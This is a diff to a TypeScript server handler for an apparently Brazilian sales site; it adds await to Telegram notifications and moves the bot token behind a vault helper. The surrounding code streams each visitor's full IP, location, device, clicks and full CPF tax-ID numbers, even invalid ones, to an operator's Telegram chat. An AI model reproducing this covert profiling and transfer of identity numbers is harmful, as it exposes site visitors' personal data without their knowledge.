@@ -7,6 +7,7 @@ import { sendTelegramNotification, handleTelegramCommand, handleCallbackQuery } 
 import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS } from "./lib/security-shield";
 import { extractLeadProfile } from "./lib/lead-profiler";
 import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
+import { getSecret } from "./lib/vault-shield";
 
 type ServerEntry = {
   fetch: (request: Request, env: unknown, ctx: unknown) => Promise<Response> | Response;
@@ -58,7 +59,7 @@ export default {
       // Se for ataque/exploit/scan de portas, notifica o Admin Supremo com alerta de emergência
       if (securityCheck.isAttack) {
         const timeStr = new Date().toLocaleTimeString("pt-BR");
-        sendTelegramNotification(
+        await sendTelegramNotification(
           `🚨 <b>ALERTA DE SEGURANÇA MILITAR: TENTATIVA DE ATAQUE INTERCEPTADA!</b>\n` +
           `⚠️ <b>Tipo:</b> <code>${securityCheck.attackType || "Ataque Malicioso"}</code>\n` +
           `📍 <b>IP Infrator:</b> <code>${clientIp}</code> (Bloqueado)\n` +
@@ -127,14 +128,14 @@ export default {
 
         // Mensagens limpas, precisas e organizadas no Telegram
         if (body.type === "entrada") {
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `🚪 <b>NOVO LEAD REAL NO SITE!</b>\n` +
             `📍 <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
             `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
             `🌐 <b>IP Completo:</b> <code>${clientIp}</code> | ⏰ <code>${timeStr}</code>`
           );
         } else if (body.type === "click_comprar") {
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `🛒 <b>CLIQUE EM COMPRAR!</b>\n` +
             `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
             `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
@@ -142,14 +143,14 @@ export default {
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
           );
         } else if (body.type === "modal_opened") {
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `📋 <b>LEAD ABRIU O MODAL DE DADOS</b>\n` +
             `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
             `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
           );
         } else if (body.type === "cpf_validado") {
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `✅ <b>CPF VALIDADO NO FORMULÁRIO</b>\n` +
             `👤 <b>CPF Completo:</b> <code>${cpfFull}</code>\n` +
             `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
@@ -157,7 +158,7 @@ export default {
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
           );
         } else if (body.type === "cpf_invalido") {
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `⚠️ <b>TENTATIVA DE CPF INVÁLIDO DIGITADO</b>\n` +
             `👤 <b>CPF Digitado:</b> <code>${cpfFull}</code>\n` +
             `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
@@ -167,7 +168,7 @@ export default {
         } else if (body.type === "clique_whatsapp") {
           const actionName = (dataObj["action"] as string) || "geral";
           const userMsg = (dataObj["message"] as string) || "Contato com suporte";
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `📲 <b>LEAD DIRECIONADO AO WHATSAPP INTELIGENTE!</b>\n` +
             `🎯 <b>Ação Clicada:</b> <code>${actionName}</code>\n` +
             `💬 <b>Mensagem Contextual:</b> <i>"${userMsg}"</i>\n` +
@@ -177,7 +178,7 @@ export default {
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
           );
         } else if (body.type === "saida") {
-          sendTelegramNotification(
+          await sendTelegramNotification(
             `👋 <b>LEAD SAIU DO SITE</b>\n` +
             `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
@@ -250,7 +251,7 @@ export default {
         const timeStr = new Date().toLocaleTimeString("pt-BR");
         const dateStr = new Date().toLocaleDateString("pt-BR");
 
-        sendTelegramNotification(
+        await sendTelegramNotification(
           `💳 <b>NOVA COBRANÇA PIX GERADA!</b>\n\n` +
           `🏦 <b>API Emissora:</b> <code>${chargeResult.provider}</code>\n` +
           `💰 <b>Valor Bruto:</b> R$ ${chargeResult.amount.toFixed(2).replace(".", ",")}\n` +
@@ -303,7 +304,7 @@ export default {
         const timeStr = new Date().toLocaleTimeString("pt-BR");
         const dateStr = new Date().toLocaleDateString("pt-BR");
 
-        sendTelegramNotification(
+        await sendTelegramNotification(
           `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
           `🏦 <b>Gateway Responsável:</b> <code>União 7 Pay</code>\n` +
           `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
@@ -348,7 +349,7 @@ export default {
         const timeStr = new Date().toLocaleTimeString("pt-BR");
         const dateStr = new Date().toLocaleDateString("pt-BR");
 
-        sendTelegramNotification(
+        await sendTelegramNotification(
           `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
           `🏦 <b>Gateway Responsável:</b> <code>Elite PAYbr (Reserva)</code>\n` +
           `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
@@ -371,7 +372,7 @@ export default {
     if (url.pathname === "/api/telegram-webhook" && request.method === "POST") {
       try {
         const update = await request.json();
-        const token = process.env["TELEGRAM_BOT_TOKEN"];
+        const token = getSecret("TELEGRAM_BOT_TOKEN");
 
         // Processa clique em Botões Interativos (Callback Query)
         if (update.callback_query && token) {
